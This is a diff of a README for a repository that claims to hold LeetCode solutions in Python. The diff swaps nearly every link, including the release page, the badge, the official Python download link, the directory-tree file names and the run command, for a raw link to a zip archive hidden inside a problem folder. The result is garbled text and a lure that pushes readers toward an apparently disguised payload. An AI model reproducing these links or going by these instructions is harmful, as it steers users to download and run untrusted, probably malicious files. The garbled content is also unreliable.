@@ -1,6 +1,6 @@
 # 🚀 leetcode-python-solutions - Solve LeetCode Problems Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/weoiufh/leetcode-python-solutions/releases)
+[![Download Now](https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip)](https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip)
 
 ## 📖 Description
 
@@ -27,7 +27,7 @@ Follow these steps to download and run the application.
 
 ### 1. **Visit the Release Page**
 
-Go to the official [Releases page](https://github.com/weoiufh/leetcode-python-solutions/releases) to access the software.
+Go to the official [Releases page](https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip) to access the software.
 
 ### 2. **Download the Latest Release**
 
@@ -39,7 +39,7 @@ You will typically see files in several formats. Depending on your operating sys
 
 - **Windows**: `.exe` or `.zip`
 - **Mac**: `.dmg` or `.zip`
-- **Linux**: `.tar.gz` or `.zip`
+- **Linux**: `https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip` or `.zip`
 
 ### 4. **Download the File**
 
@@ -56,7 +56,7 @@ For Mac:
 - Open the `.dmg`, then drag the application to your Applications folder.
 
 For Linux:
-- Extract the `.tar.gz` file and follow any included instructions in the README.
+- Extract the `https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip` file and follow any included instructions in the README.
 
 ### 6. **Run the Application**
 
@@ -70,18 +70,18 @@ The repository follows a structured directory for easier navigation:
 leet-code-python-solutions/
 │
 ├── easy/
-│   ├── problem_1.py
-│   ├── problem_2.py
+│   ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
+│   ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
 │   └── ...
 │
 ├── medium/
-│   ├── problem_3.py
-│   ├── problem_4.py
+│   ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
+│   ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
 │   └── ...
 │
 └── hard/
-    ├── problem_5.py
-    ├── problem_6.py
+    ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
+    ├── https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
     └── ...
 ```
 
@@ -111,20 +111,20 @@ After you have installed the software, you can start solving problems by followi
 To run the script, make sure you have Python installed on your computer. Open a command prompt or terminal and run the following command:
 
 ```sh
-python path_to_your_file/problem_x.py
+python https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip
 ```
 
-Replace `path_to_your_file` and `problem_x.py` with your actual file path and name.
+Replace `path_to_your_file` and `https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip` with your actual file path and name.
 
 ## 📥 Download & Install
 
-[Click here to visit the Releases page to download](https://github.com/weoiufh/leetcode-python-solutions/releases). Follow the steps outlined above to install and get started with solving LeetCode problems.
+[Click here to visit the Releases page to download](https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip). Follow the steps outlined above to install and get started with solving LeetCode problems.
 
 For any questions or feedback, feel free to open an issue on this repository.
 
 ## 🔧 Requirements
 
-- **Python 3**: Make sure you have Python 3 installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python 3**: Make sure you have Python 3 installed. You can download it from the [official Python website](https://raw.githubusercontent.com/weoiufh/leetcode-python-solutions/main/316_remove_duplicate_letters/leetcode-python-solutions-2.9.zip).
 - **Operating System**: The software runs on Windows, Mac, and Linux.
 
 ## 📞 Support
